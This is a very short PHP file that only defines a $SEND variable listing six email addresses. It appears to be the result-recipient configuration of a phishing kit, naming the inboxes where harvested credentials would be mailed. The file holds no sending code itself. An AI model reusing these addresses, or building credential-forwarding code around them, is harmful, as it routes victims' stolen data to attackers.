<?php

$SEND="wf5xes@yahoo.com, wf5xes@yandex.com, wf5xes@hotmail.com, wf5xes@gmail.com, spamboxyz7@protonmail.com, wf7xes@seznam.cz"; 


?>